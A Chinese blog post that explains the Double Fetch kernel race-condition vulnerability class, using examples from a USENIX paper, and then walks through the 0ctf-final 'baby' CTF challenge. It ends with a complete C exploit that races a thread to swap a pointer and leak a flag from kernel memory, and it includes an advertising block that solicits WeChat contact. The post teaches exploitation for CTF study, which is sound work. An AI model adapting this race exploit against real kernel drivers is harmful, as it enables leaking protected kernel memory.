# 前言

Double
Fetch(双取)是一种条件竞争的漏洞，相关的论文发表在USENIX，论文链接：<https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-wang.pdf>

# Double Fetch

Double
Fetch是内核的一种漏洞类型，发生在内核从用户空间中拷贝数据时，两次访问了相同一块内存。如下图示（图片来自论文），内核从用户空间拷贝数据时，第一次拷贝会进行安全检测，而第二次拷贝时才会进行数据的使用，那么在第一次拷贝与第二次拷贝的间隙，就能够进行恶意数据篡改。举个例子，在第一次时从用户空间中获取了需要拷贝的长度，并进行长度的检测，但是在第二次拷贝时会再次拷贝长度，并且根据该长度进行数据的拷贝。但是此时的长度是没有经过校验的，因此当该长度在第一次拷贝与第二次拷贝之间被修改，就会导致漏洞的发生。这种漏洞就被称之为Double
Fetch。

![image-20230713134722390](https://image.3001.net/images/20230810/1691635425_64d44ee16cf8d99a01590.png!small)

论文的作者总结了容易发生Double
Fetch的情况，如下图示（图片来自论文）。通常用户进程会通过指定的消息格式与内核进行通信，而消息格式通常由消息头与消息体构成。消息头包含了一些特殊属性，比如消息的长度，消息的类型等。那么内核通常会取出消息头，根据消息头的信息，进行不同的分支执行。若在进入分支后，内核依旧提取出消息头，并使用了前面使用过的字段，就非常容易发生Double
Fetch，因为在这两次提取的过程中，用户态的程序可以修改消息头。

![image-20230713140815577](https://image.3001.net/images/20230810/1691635426_64d44ee2691bb19637f85.png!small)

作者根据Double Fetch发生的场景，并将其进行分类

  * 类型选择

  * 长度检查

  * 浅拷贝

## 类型选择

类型选择的`Double Fetch`，如下图示（图片来自论文）。代码截取自`cxgb3
main.c`。可以看到下述代码首先通过`copy_from_user`函数从`useraddr`中拷贝数据到`cmd`中，而`useraddr`为用户空间的地址。而后续的流程会根据从`useraddr`中提取出的数据从而选择执行。并且在每个分支中，又通过`copy_from_user`函数从`useraddr`的地址中取出数据，做后续的处理。若在后续的处理中又重复使用到了`cmd`那么就会导致`Double
Fetch`。

![image-20230713142023576](https://image.3001.net/images/20230810/1691635427_64d44ee3cc502587632ac.png!small)

## 长度选择

长度选择的`Double
Fetch`，如下图示（图片来自论文）。在第一次拷贝是通过`copy_from_user`从`arg`中获取数据，并且提取了`header.Size`，在第二次时又重复了这个过程，这就是明显的`Double
Fetch`。若在两次提取之间修改了`header.Size`值，并通过`aac_fib_send`函数发送数据，那么就会导致漏洞的发送，即可以泄露比原本`header.Size`值更大的数据量。

![image-20230713143534035](https://image.3001.net/images/20230810/1691635429_64d44ee507bd1538fbdc2.png!small)

## 浅拷贝

浅拷贝则是第一次的拷贝只是将指向用户数据的指针拷贝到内核中，后续在将用户数据拷贝进来。如下图示（图片来自论文）。第一次获取时是通过指向用户数据的指针的指针，而第二次同样是这么获取的，那么在第一次与第二次的间隔中修改指针的指向就会导致数据被修改。

![image-20230713144330557](https://image.3001.net/images/20230810/1691635430_64d44ee667fc3c5aa3513.png!small)

举个例子，即内核拷贝时并不是把能够读取用户数据的地址拷贝进来，而是将指向该地址的地址给拷贝进来，即下图中的`ptr`，因此后续内核在读取数据的时候都是通过`ptr`进行获取，那么在两次获取的中途修改了`ptr`的指向，那么就可以使得内核指向恶意数据。

![未命名文件](https://image.3001.net/images/20230810/1691635431_64d44ee78fbb7492d65ad.png!small)

总结一下Double Fetch的利用流程

  * 内核会从用户空间中获取数据，并且会两次获取相同空间的数据

  * 在两次获取的过程中没有检测获取的数据是否一致

  * 最后在两次获取的过程中，篡改该空间的数据

# 20180ctf-final-baby

题目链接：<https://github.com/h0pe-ay/Kernel-Pwn/tree/master/0ctf-final-baby>

【----帮助网安学习，以下所有学习资料免费领！加vx：yj009991，备注“freebuf”获取！】

① 网安学习成长路径思维导图  
② 60+网安经典常用工具包  
③ 100+SRC漏洞分析报告  
④ 150+网安攻防实战技术电子书  
⑤ 最权威CISSP 认证考试指南+题库  
⑥ 超1800页CTF实战技巧手册  
⑦ 最新网安大厂面试题合集（含答案）  
⑧ APP客户端安全检测指南（安卓+IOS）

在模块中存在`baby_ioctl`函数，若`rsi`的值为0x6666则会将`flag`输出，由于是通过`printk`，因此需要通过`dmesg`输出，若`rsi`为0x1337，则会经过一个校验函数，若通过该校验流程，则会将`flag`的值与传入的地址的内容进行比较，若内容完全一致，那么则会将`flag`直接输出，同样的该输出是通过`printk`，因此需要通过`dmesg`进行打印。

![image-20230713151512178](https://image.3001.net/images/20230810/1691635432_64d44ee8a46e84d222fa3.png!small)

接着看校验函数，该函数很简单，接受三个参数，`a1`、`a2`、`a3`，若`a1 + a2 <
a3`则通过检查。而a1的值是我们所控制的，即`rdx`寄存器的值，而`a3`的值则是通过`&ampcurrent_task`中获取的。

![image-20230713151905552](https://image.3001.net/images/20230810/1691635434_64d44eea9e0245f060d49.png!small)

可以发现从`&ampcurrent_task`中获取的地址为`0x7ffffffff000`

![image-20230713153756972](https://image.3001.net/images/20230810/1691635435_64d44eeb9e94d166061b3.png!small)

下图为用户空间的地址分布，可以看到`0x7ffffffff000`为末尾地址，因此该检测即使若传入的地址是用户空间地址则通过，传入内核空间地址就不通过。

![image-20230713154124891](https://image.3001.net/images/20230810/1691635438_64d44eee6a9f518943e7c.png!small)

这么做的原因是因为，`flag`字符串是硬编码到驱动中的，若能够读取内核空间的内容，岂不是可以直接读取了？因此该题做了隔离。

![image-20230713154417553](https://image.3001.net/images/20230810/1691635439_64d44eefbf987f8816fec.png!small)

那么这题就能够使用`Double Fetch`进行利用，重点来看检测部分。驱动会进行三块检测

  * 检查传入的地址是否为用户空间的地址

  * 检查传入的地址的内容的值是否为用户空间的地址

  * 检查传入的长度是否与`flag`的长度一致

总的来说从用户空间中我们传入了一个结构体

    
    
    typedef struct  
    {  
    char *flag_addr;  
    unsigned long flag_len;  
    };

![image-20230713154600216](https://image.3001.net/images/20230810/1691635440_64d44ef0c53af823558d5.png!small)

可以看到该题在检测的时候获取的用户空间的地址`v5`，接着在循环过程中再一次获得用户空间的地址`v5`，在这两次获取的过程中并没有去比较值是否被修改了，那么就导致了`Double
Fetch`。

利用的思路如下

  * 在检测阶段，`v5`的我们使用用户空间的变量值进行赋值，即`v5 = buf`

  * 而进入比较阶段，`v5`的值我们使用`flag`的地址值进行赋值，即`v5 = flag`

那么如何获得进入比较阶段的时间点呢，可以看到题目即使比较失败也不会发生异常而是简单的返回，因此我们可以开启一个线程，不断的修改`v5 = flag`即可

    
    
    ...  
    void *  
    rewrite_flag_addr(void *arg)  
    {  
    pdata data = (pdata)arg;  
    while(finish == 0)  
    {  
    data->flag_addr = (char *)target_addr;  
    //printf("%p\n",data_flag.flag_addr);  
    }  
    }  
    ...  
    err = pthread_create(&ntid, NULL, rewrite_flag_addr, &data_flag);  
    ...

具体流程如下图，这里用线程的原因

  * 主线程与子线程异步执行

  * 线程之间共享内存信息

因此可以利用其他线程去修改共享的内存

![未命名文件
\(1\)](https://image.3001.net/images/20230810/1691635441_64d44ef1c711099d366b8.png!small)

## 完整exp

    
    
    #include <stdio.h>  
    #include <fcntl.h>  
    #include <string.h>  
    #include <unistd.h>  
    #include <sys/ioctl.h>  
    #include <pthread.h>  
    ​  
    #define MAXSIZE 1024  
    #define MAXTIME 1000000  
    ​  
    unsigned long target_addr;  
    int finish;  
    typedef struct   
    {  
    char* flag_addr;  
    unsigned long flag_len;  
    }data, *pdata;  
    data data_flag;  
    int fd;  
    ​  
    void *  
    rewrite_flag_addr(void *arg)  
    {  
    pdata data = (pdata)arg;  
    while(finish == 0)  
    {  
    data->flag_addr = (char *)target_addr;  
    //printf("%p\n",data_flag.flag_addr);  
    }  
    }  
    ​  
    ​  
    int main()  
    {  
    fd = open("/dev/baby", O_RDWR);  
    __asm(  
    ".intel_syntax noprefix;"  
    "mov rax, 0x10;"  
    "mov rdi, fd;"  
    "mov rsi, 0x6666;"  
    "syscall;"  
    ".att_syntax;"  
    );    
      
    char buf[MAXSIZE];  
    char *target;  
    int count;  
    int flag = open("/dev/kmsg", O_RDONLY);  
    if (flag == -1)  
    printf("open dmesg error");  
    while ((count = read(flag, buf, MAXSIZE)) > 0)  
    {  
    if ((target = strstr(buf, "Your flag is at ")) > 0)  
    {  
    target = target + strlen("Your flag is at ");  
    char *temp = strstr(target, "!");  
    target[temp - target] = 0;  
    target_addr = strtoul(target, NULL, 16);  
    printf("flag address:0x%s\n",target);  
    printf("flag address:0x%lx\n", target_addr);  
    break;  
    }  
    }     
    data_flag.flag_addr = buf;  
    data_flag.flag_len = 33;  
    pthread_t ntid;  
    int err;  
    err = pthread_create(&ntid, NULL, rewrite_flag_addr, &data_flag);     
    for (int i = 0; i < MAXTIME; i++)  
    {  
    ioctl(fd, 0x1337, &data_flag);  
    data_flag.flag_addr = buf;  
    //printf("%d\n",i);  
    }  
    finish = 1;  
    pthread_join(ntid, NULL);  
    printf("end!");  
    //system("dmesg | grep flag");  
    }

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

  

